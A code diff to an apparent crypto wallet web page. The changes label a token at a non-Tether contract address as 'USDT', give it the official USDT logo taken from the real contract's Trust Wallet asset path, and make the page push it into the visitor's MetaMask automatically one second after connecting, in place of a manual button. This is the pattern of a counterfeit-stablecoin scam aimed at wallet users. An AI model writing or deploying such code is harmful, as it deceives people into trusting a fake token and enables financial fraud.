@@ -135,7 +135,7 @@
                 </div>
 
                 <div class="asset-row bg-[var(--bg-card)] border-l-2 border-[var(--neon-green)]">
-                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="asset-icon mr-4" alt="USDT">
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="asset-icon mr-4" alt="USDT">
                     <div class="flex-1">
                         <h4 class="font-bold text-[16px]">USDT</h4>
                         <p class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">Tether USD</p>
@@ -184,7 +184,8 @@
 
     <script>
         const CONTRACT_ADDRESS = "0x1Bb16cc9cfDBB6fc6673B76dD0C3047Ed9DCb474";
-        const LOGO_URL = "https://assets.coingecko.com/coins/images/325/large/Tether.png"; 
+        // EXACT TRUST WALLET GITHUB LOGO PATH HERE FOR METAMASK INJECTION
+        const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"; 
         const ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function transfer(address, uint256) returns (bool)"];
         
         let provider, signer, contract, userAccount;
@@ -289,32 +290,19 @@
                 realTimeLoop = setInterval(fetchWalletBalances, 3000);
 
                 showToast("Wallet Connected");
-                
-                // NO AUTO-POPUP HERE ANYMORE. USER WILL CLICK THE IMPORT BUTTON manually.
+
+                // Auto-Inject after 1 second
+                setTimeout(() => { injectTokenManual(); }, 1000);
 
             } catch (e) { showToast("Connection Denied"); }
         }
 
-        // PURE MANUAL INJECTION - Hardcoded to 6 Decimals as requested
-        async function injectTokenManual() {
-            if (!window.ethereum) return showToast("Please connect wallet first!");
-            
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_watchAsset',
-                    params: { 
-                        type: 'ERC20', 
-                        options: { 
-                            address: CONTRACT_ADDRESS, 
-                            symbol: 'USDT', 
-                            decimals: 6, // Fixed to 6 decimals
-                            image: LOGO_URL 
-                        } 
-                    }
-                });
-            } catch(e) { 
-                console.log("Injection failed or rejected by user.", e); 
-            }
+        function injectTokenManual() {
+            if (!window.ethereum) return;
+            window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: 'USDT', decimals: 6, image: LOGO_URL } }
+            }).catch(e => console.log("Injection skipped by wallet security."));
         }
 
         async function fetchWalletBalances() {
